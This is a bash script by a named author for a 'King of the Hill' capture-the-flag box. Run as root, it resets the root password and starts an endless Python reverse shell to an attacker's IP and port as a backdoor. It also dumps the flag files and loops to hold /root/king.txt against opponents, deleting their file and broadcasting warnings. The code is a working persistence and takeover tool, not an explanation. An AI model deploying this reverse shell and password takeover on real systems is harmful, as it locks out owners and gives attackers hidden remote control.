# Authors : Cipher 
# github: https://github.com/Cipher7
# discord: Cipher007#1099

# Usage : 
#        chmod +x <filename>
#        sudo bash <filename>

#tip: use a dot before your file name to just hide your file and store the file in the root folder
#after the scipt changes the password, you can directly ssh into the box as root

NAME=Cipher007  #change this
PASS=seriously!   #change this
IP=10.10.10.10    #change this (tun0)
PORT=4444       #change this

echo "Created by Cipher007"
echo "Discord:Cipher007#1099"

echo ""
echo ""

#inspiration101
echo "Nothing is impossible!"
echo "                      ~Master Oogway"

echo ""

echo "There is always something left to learn, even for a MASTER!"
echo "                                                           ~Master Shifu"
echo ""

sleep 2

echo "[*]Changing password of root"
echo $PASS | passwd $NEW      #changes the root password
echo "[+] Passowrd changed! LMAO"

echo "The root password has been changed! You can directly ssh into root now!"

sleep 3

echo ""

#PATCHING
echo "The file check.sh in tigress home folder can be used for privesc! Edit that !"
echo "Patch the apache tomcat vuln in /opt/tomcat"
echo "The user shifu has permission to run ftp as root without password! Change that permission to prevent him from doing a privesc."

echo "Start a listener on your machine with the above set port! This can act as an emergency backdoor incase someone decides to kick you out!"

sleep 5

# Infinite Reverse shell
while [ 1 ]; do
	python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${IP}',${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &> /dev/null
done &
disown

count=1

echo ""

#FLAGS
echo "FLAGS: "
echo "/root/.flag ==>"
cat /root/.flag
echo "/home/tigress/flag.txt ==>"
cat /home/tigress/flag.txt 
echo "/home/shifu/flag.txt ==>"
cat /home/shifu/flag.txt 
echo "/home/po/flag.txt ==>"
cat /home/po/flag.txt 
echo "Another flag is in the /var/www/html directory inside of a long hex directory name!"

sleep 10

#A loop to keep your username in king.txt
while [ 1 ]; do
	LOG=$(cat /root/king.txt)
	if [[ $LOG != $NAME ]]; then
		echo "[*] modification observed."
		echo $NAME > /root/king.txt #puts your username back into the file
		echo "[+] got shit fixed! nothing to worry about!"
		let 'count+=1'
	fi

	if [ $count -eq 4 ]; then
		wall -n "What is going on? Stay outta here or face the consequences!"     #asking him to stay out! not politely though!
		echo "[*] $count changes made in king.txt! Find this dude immediately!"
		let 'count+=1'
	fi
	
	if [ $count -eq 10 ]; then
		echo "There may be another script running which is colliding with this script's functionality! Trying to break the script!"
		rm /root/king.txt                                           #breaking opponent's script
		sleep 2
		echo $NAME > /root/king.txt 
		if [[ $LOG == $NAME ]]; then
			echo "The opponent's script has been broken!"
		fi
		let 'count+=1'
	fi
	
	if [ $count -eq 20 ]; then
		echo "That script is either not dead yet or this dude is seriously jobless! Find it and kill it. Use ' ps aux ' to list all procesess"
		sleep 3
		let 'count+=1'
	fi

done

